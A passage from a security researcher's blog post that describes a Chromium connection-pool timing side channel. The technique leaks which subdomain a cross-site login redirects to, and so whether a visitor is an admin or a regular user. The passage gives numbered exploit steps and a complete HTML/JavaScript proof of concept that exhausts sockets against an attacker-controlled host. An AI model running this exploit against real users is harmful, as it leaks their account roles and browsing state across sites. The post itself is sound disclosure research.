+). In short:</p><ul><li>Google acts as the OpenID Connect provider</li><li>There are two roles: admins and users</li><li>Each role has its own subdomain: admin.test.localhost.com (admins) and app.test.localhost.com (users).</li><li>After login, the user is redirected to their subdomain.</li><li>Hitting <code>/login</code> again auto-redirects to that subdomain.</li></ul><p>With our technique, we can tell in under two seconds whether a visitor is an admin or a regular user! The idea is similar to the subdomain trick, but redirects add an extra step: reqeusting <code>auth.localhost.com/login</code> triggers a second request (the redirect). We need to isolate that. We do this by freeing and re-blocking the last socket so the initial request completes while the redirect is forced to wait.</p><p>From there, it&rsquo;s the same ordering oracle: choose a hostname that sorts between <code>admin</code> and <code>app</code>, let&rsquo;s say <code>ajj</code>. If the user is an admin, the redirect to <code>admin.test.localhost.com</code> will be scheduled before our request to <code>ajj.attacker.com</code>, so our request will be delayed. If the user is a regular user, the redirect goes to <code>app.test.localhost.com</code>, which sorts after <code>ajj.attacker.com</code>, so our request finishes immediately.</p><p>Because the redirect navigation has <code>VeryHigh</code> priority, our requests must match that priority, a frame navigation works.</p><p>Exploit steps:</p><ul><li>Exhaust the entire pool</li><li>Open <code>auth.localhost.com/login</code> in a window</li><li>Free exactly one socket and then immediately block it again, ensuring the first request gets scheduled while the redirect request remains pending.</li><li>Trigger a frame navigation to <code>ajj.attacker.com</code> (same priority as the redirect)</li><li>Free one socket and then re-block it immediately, forcing a &ldquo;race&rdquo; between the pending redirect and our pending frame navigation.</li><li>Send a new frame navigation to a host that is always lexicographically smallest (eg. <code>0000000.attacker.com</code>) and make it take ~500ms to complete.</li><li>Finally, free one socket and immediately re-block it. Our <code>0000000.attacker.com</code> request will always win the race, causing the pending one to hang for ~500 ms longer.</li><li>If our request stalls, the redirect host sorts before <code>ajj.attacker.com</code> (<code>admin.test.localhost.com</code>). If our request finishes immediately, then the redirect host sorts after <code>ajj</code> (<code>app.test.localhost.com</code>)</li></ul><p>This single comparision is enough to distinguish admin vs user. If you had more than two candidates, you can extend it to a binary search just like before.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE html&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>html</span> <span class=na>lang</span><span class=o>=</span><span class=s>&#34;en&#34;</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>head</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>title</span><span class=p>&gt;</span>Hello world<span class=p>&lt;/</span><span class=nt>title</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>head</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>body</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>button</span> <span class=na>onclick</span><span class=o>=</span><span class=s>&#34;popunder();&#34;</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>click me pls
+</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>button</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl><span class=kd>let</span> <span class=nx>w</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>popunder</span> <span class=o>=</span> <span class=p>()</span> <span class=p>=&gt;</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nb>window</span><span class=p>.</span><span class=nx>opener</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>            <span class=nx>w</span> <span class=o>=</span> <span class=nb>window</span><span class=p>.</span><span class=nx>opener</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span><span class=k>else</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nx>w</span> <span class=o>=</span> <span class=nb>window</span><span class=p>.</span><span class=nx>open</span><span class=p>(</span><span class=sb>`</span><span class=si>${</span><span class=nx>location</span><span class=p>.</span><span class=nx>href</span><span class=si>}</span><span class=sb>#1`</span><span class=p>,</span> <span class=nx>target</span><span class=o>=</span><span class=s2>&#34;_blank&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=nx>location</span> <span class=o>=</span> <span class=sb>`about:blank`</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=nx>SOCKETLIMIT</span> <span class=o>=</span> <span class=mi>255</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nx>MYSERVER</span> <span class=o>=</span> <span class=sb>`...`</span><span class=p>;</span> <span class=c1>// eg. sleep.attacker.com
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>sleep</span> <span class=o>=</span> <span class=p>(</span><span class=nx>ms</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=k>new</span> <span class=nb>Promise</span><span class=p>(</span><span class=nx>resolve</span> <span class=p>=&gt;</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nx>setTimeout</span><span class=p>(</span><span class=nx>resolve</span><span class=p>,</span> <span class=nx>ms</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=p>});</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>controllers</span> <span class=o>=</span> <span class=p>[];</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kr>async</span> <span class=kd>function</span> <span class=nx>loadIframe</span><span class=p>(</span><span class=nx>url</span><span class=p>,</span> <span class=nx>name</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=kr>const</span> <span class=nx>iframe</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s1>&#39;iframe&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nx>iframe</span><span class=p>.</span><span class=nx>src</span> <span class=o>=</span> <span class=nx>url</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=nx>iframe</span><span class=p>.</span><span class=nx>name</span> <span class=o>=</span> <span class=nx>name</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=nx>iframe</span><span class=p>.</span><span class=nx>style</span><span class=p>.</span><span class=nx>width</span> <span class=o>=</span> <span class=s1>&#39;200px&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=nx>iframe</span><span class=p>.</span><span class=nx>style</span><span class=p>.</span><span class=nx>height</span> <span class=o>=</span> <span class=s1>&#39;200px&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=nx>iframe</span><span class=p>.</span><span class=nx>style</span><span class=p>.</span><span class=nx>display</span> <span class=o>=</span> <span class=s1>&#39;none&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=nb>document</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>iframe</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=k>new</span> <span class=nb>Promise</span><span class=p>((</span><span class=nx>resolve</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=kd>let</span> <span class=nx>start</span> <span class=o>=</span> <span class=nx>performance</span><span class=p>.</span><span class=nx>now</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>            
+</span></span><span class=line><span class=cl>            <span class=kr>const</span> <span class=nx>cleanup</span> <span class=o>=</span> <span class=p>()</span> <span class=p>=&gt;</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=kd>let</span> <span class=nx>end</span> <span class=o>=</span> <span class=nx>performance</span><span class=p>.</span><span class=nx>now</span><span class=p>()</span> <span class=o>-</span> <span class=nx>start</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>                <span class=nx>iframe</span><span class=p>.</span><span class=nx>src</span> <span class=o>=</span> <span class=s2>&#34;about:blank&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>                <span class=nb>document</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>removeChild</span><span class=p>(</span><span class=nx>iframe</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>                <span class=nx>resolve</span><span class=p>(</span><span class=nx>end</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>            <span class=p>};</span>
+</span></span><span class=line><span class=cl>            
+</span></span><span class=line><span class=cl>            <span class=nx>iframe</span><span class=p>.</span><span class=nx>onload</span> <span class=o>=</span> <span class=nx>cleanup</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=nx>iframe</span><span class=p>.</span><span class=nx>onerror</span> <span class=o>=</span> <span class=nx>cleanup</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>});</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>log</span> <span class=o>=</span> <span class=p>(</span><span class=nx>l</span><span class=p>,</span> <span class=nx>type</span> <span class=o>=</span> <span class=s1>&#39;INFO&#39;</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nx>logtextarea</span><span class=p>.</span><span class=nx>value</span> <span class=o>+=</span> <span class=sb>`</span><span class=si>${</span><span class=nx>l</span><span class=si>}</span><span class=sb>\n`</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=nx>logtextarea</span><span class=p>.</span><span class=nx>scrollTop</span> <span class=o>=</span> <span class=nx>logtextarea</span><span class=p>.</span><span class=nx>scrollHeight</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>fetch_sleep_long</span> <span class=o>=</span> <span class=p>(</span><span class=nx>i</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nx>controller</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>AbortController</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>        <span class=kr>const</span> <span class=nx>signal</span> <span class=o>=</span> <span class=nx>controller</span><span class=p>.</span><span class=nx>signal</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nx>fetch</span><span class=p>(</span><span class=sb>`http://sleep</span><span class=si>${</span><span class=nx>i</span><span class=si>}</span><span class=sb>.</span><span class=si>${</span><span class=nx>MYSERVER</span><span class=si>}</span><span class=sb>/360?q=</span><span class=si>${</span><span class=nx>i</span><span class=si>}</span><span class=sb>`</span><span class=p>,</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nx>mode</span><span class=o>:</span> <span class=s1>&#39;no-cors&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nx>signal</span><span class=o>:</span> <span class=nx>signal</span>
+</span></span><span class=line><span class=cl>        <span class=p>});</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nx>controller</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>block_socket</span> <span class=o>=</span> <span class=kr>async</span> <span class=p>(</span><span class=nx>i</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=kd>let</span> <span class=nx>controller</span> <span class=o>=</span> <span class=nx>fetch_sleep_long</span><span class=p>(</span><span class=nx>i</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=kr>await</span> <span class=nx>sleep</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nx>controller</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>exhaust_sockets</span> <span class=o>=</span> <span class=kr>async</span><span class=p>()</span> <span class=p>=&gt;</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=kd>let</span> <span class=nx>i</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(;</span> <span class=nx>i</span> <span class=o>&lt;</span> <span class=nx>SOCKETLIMIT</span><span class=p>;</span> <span class=nx>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=kd>let</span> <span class=nx>controller</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>block_socket</span><span class=p>(</span><span class=nx>i</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>            <span class=nx>controllers</span><span class=p>.</span><span class=nx>push</span><span class=p>(</span><span class=nx>controller</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kr>async</span> <span class=kd>function</span> <span class=nx>clearIframes</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>        <span class=kr>const</span> <span class=nx>iframes</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>querySelectorAll</span><span class=p>(</span><span class=s1>&#39;iframe&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nx>iframes</span><span class=p>.</span><span class=nx>forEach</span><span class=p>(</span><span class=nx>iframe</span> <span class=p>=&gt;</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nx>iframe</span><span class=p>.</span><span class=nx>src</span> <span class=o>=</span> <span class=s1>&#39;about:blank&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=nx>iframe</span><span class=p>.</span><span class=nx>remove</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>        <span class=p>});</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kr>async</span> <span class=kd>function</span> <span class=nx>test</span><span class=p>(</span><span class=nx>w</span><span class=p>,</span> <span class=nx>sb</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>        <span class=kr>await</span> <span class=nx>clearIframes</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s2>&#34;block fetch sleep long&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=c1>// 1) exhaust the last socket
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=kd>let</span> <span class=nx>block</span> <span class=o>=</span> <span class=nx>fetch_sleep_long</span><span class=p>(</span><span class=mi>1234</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=c1>// 2) Open `auth.localhost.com/login` in a window
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=kr>await</span> <span class=nx>sleep</span><span class=p>(</span><span class=mi>20</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nx>w</span><span class=p>.</span><span class=nx>location</span> <span class=o>=</span> <span class=sb>`http://auth.localhost.com/login?</span><span class=si>${</span><span class=nb>Math</span><span class=p>.</span><span class=nx>random</span><span class=p>()</span><span class=si>}</span><span class=sb>`</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=c1>// 3) Free exactly one socket and then immediately block it again
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl>        <span class=kr>await</span> <span class=nx>sleep</span><span class=p>(</span><span class=mi>100</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nx>block</span><span class=p>.</span><span class=nx>abort</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>        <span class=nx>block</span> <span class=o>=</span> <span class=nx>fetch_sleep_long</span><span class=p>(</span><span class=mi>1234</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=c1>// 4) Trigger a frame navigation to `ajj.attacker.com`
+</span></span></span><span class=line><span class=cl><span class=c1></span>        
+</span></span><span class=line><span class=cl>        <span class=kr>await</span> <span class=nx>sleep</span><span class=p>(</span><span class=mi>20</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=kd>let</span> <span class=nx>p</span> <span class=o>=</span> <span class=nx>loadIframe</span><span class=p>(</span><span class=sb>`http://</span><span class=si>${</span><span class=nx>sb</span><span class=si>}</span><span class=sb>.</span><span class=si>${</span><span class=nx>MYSERVER</span><span class=si>}</span><span class=sb>/0?</span><span class=si>${</span><span class=nb>Math</span><span class=p>.</span><span class=nx>random</span><span class=p>()</span><span class=si>}</span><span class=sb>`</span><span class=p>,</span> <span class=s2>&#34;win1&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=c1>// 5) Free one socket and then re-block it immediately, forcing a &#34;race&#34; between the pending redirect and our pending frame navigation
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl>        <span class=kr>await</span> <span class=nx>sleep</span><span class=p>(</span><span class=mi>100</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=nx>block</span><span class=p>.</span><span class=nx>abort</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>        <span class=nx>block</span> <span class=o>=</span> <span class=nx>fetch_sleep_long</span><span class=p>(</span><span class=mi>1234</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=c1>// 6) We send a new frame navigation which will take ~500ms to finish
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl>        <span class=kd>let</span> <span class=nx>p2</span> <span class=o>=</span> <span class=nx>loadIframe</span><span class=p>(</span><span class=sb>`http://00000000000000000000.</span><span class=si>${</span><span class=nx>MYSERVER</span><span class=si>}</span><span class=sb>/ssleep/500?</span><span class=si>${</span><span class=nb>Math</span><span class=p>.</span><span class=nx>random</span><span class=p>()</span><span class=si>}</span><span class=sb>`</span><span class=p>,</span> <span class=s2>&#34;win2&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=kr>await</span> <span class=nx>sleep</span><span class=p>(</span><span class=mi>100</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=c1>// 7) Finally, free one socket and then re-block it immediately
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl>        <span class=nx>block</span><span class=p>.</span><span class=nx>abort</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>        <span class=nx>block</span> <span class=o>=</span> <span class=nx>fetch_sleep_long</span><span class=p>(</span><span class=mi>1234</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=kr>await</span> <span class=nx>sleep</span><span class=p>(</span><span class=mi>500</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nx>block</span><span class=p>.</span><span class=nx>abort</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=kd>let</span> <span class=nx>res</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>p</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>res</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nx>res</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kr>async</span> <span class=kd>function</span> <span class=nx>main</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>        <span class=kr>await</span> <span class=nx>exhaust_sockets</span><span class=p>()</span> <span class=c1>// Exhaust the entire pool - 1
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl>        <span class=kd>let</span> <span class=nx>result</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>test</span><span class=p>(</span><span class=nx>w</span><span class=p>,</span> <span class=s2>&#34;ajjjjjjj&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nx>result</span> <span class=o>&gt;</span> <span class=mi>500</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>            <span class=nb>document</span><span class=p>.</span><span class=nx>write</span><span class=p>(</span><span class=sb>`You&#39;re an admin (admin.test.localhost.com)`</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span><span class=k>else</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nb>document</span><span class=p>.</span><span class=nx>write</span><span class=p>(</span><span class=sb>`You&#39;re a regular user (app.test.localhost.com)`</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>        
+</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>location</span><span class=p>.</span><span class=nx>hash</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>        <span class=nx>main</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>        <span class=nx>w</span> <span class=o>=</span> <span class=nb>window</span><span class=p>.</span><span class=nx>opener</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
+</span></span></code></pre></div><h3 id=poc---admin><a class=full-clickable-heading href=#poc---admin>PoC - admin</a></h3><div style=position:relative;padding-bottom:56.25%;height:0;overflow:hidden><iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen loading=eager referrerpolicy=strict-origin-when-cross-origin src="https://www.youtube.com/embed/s6hSHByoAn0?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style=position:absolute;top:0;left:0;width:100%;height:100%;border:0 title="YouTube video"></iframe></div><h3 id=poc---user><a class=full-clickable-heading href=#poc---user>PoC - user</a></h3><div style=position:relative;padding-bottom:56.25%;height:0;overflow:hidden><iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen loading=eager referrerpolicy=strict-origin-when-cross-origin src="https://www.youtube.com/embed/a29-Jlp0a5w?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style=position:absolute;top:0;left:0;width:100%;height:100%;border:0 title="YouTube video"></iframe></div><h2 id=use-cases><a class=full-clickable-heading href=#use-cases>Use cases</a></h2><p>This technique is not limited to leaking subdomains of cross-origin requests but it&rsquo;s useful in several other scenarios:</p><ul><li>Cross-Origin Request Counting:
+<a href=https://blog.babelo.xyz/posts/css-exfiltration-under-default-src-self/#swimming-in-the-connection-pool- rel=noopener>https://blog.babelo.xyz/posts/css-exfiltration-under-default-src-self/#swimming-in-the-connection-pool-</a></li><li>Delay POST requests:
+<a href=https://github.com/icesfont/ctf-writeups/tree/main/idekctf/2025#appendix rel=noopener>https://github.com/icesfont/ctf-writeups/tree/main/idekctf/2025#appendix</a></li><li>Leak the scheme of cross-origin requests</li><li>Leak the port of cross-origin requests</li><li>Possibly leak <code>GroupId.privacy_mode_</code><sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup> (not verified).</li></ul><h2 id=limitations><a class=full-clickable-heading href=#limitations>Limitations</a></h2><p>Only works in Chromium-based browsers</p><h2 id=conclusion><a class=full-clickable-heading href=#conclusion>Conclusion</a></h2><p>This post is a follow-up to my
+<a href=https://blog.babelo.xyz/posts/css-exfiltration-under-default-src-self/ rel=noopener>previous post</a>
+from a few months ago. Since then, I reported the behaviour to Chrome. Because it&rsquo;s essentially a variant of the
+<a href=https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/ rel=noopener>classic connection-pool</a>
+exhaustion attack, they considered it likely WAI and I don&rsquo;t think it will be fixed soon.</p><p>Thanks for reading.</p><div class=footnotes role=doc-endnotes><hr><ol><li id=fn:1><p><a href="https://source.chromium.org/chromium/chromium/src/+/main:net/socket/client_socket_pool.h;l=162;drc=48d6f7175422b2c969c14258f9f8d5b196c28d18" rel=noopener>https://source.chromium.org/chromium/chromium/src/+/main:net/socket/client_socket_pool.h;l=162;drc=48d6f7175422b2c969c14258f9f8d5b196c28d18</a>
+&#160;<a href=#fnref:1 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li></ol></div></div></article></main></div><footer><hr><p id=social>Find me around the web:<br><a href=https://github.com/salvatore-abello>Github</a>
+|
+<a href=https://www.linkedin.com/in/salvatore-abello/>Linkedin</a>
+|
+<a href=https://x.com/salvatoreabello>X</a></p><p class=copyright>Copyright © 2025. All rights deserved.</p><hr><code>Made with ❤️ by <strong>Salvatore Abello</strong></code> | <a href=/index.xml><b>RSS</b></a></footer></div></body></html>
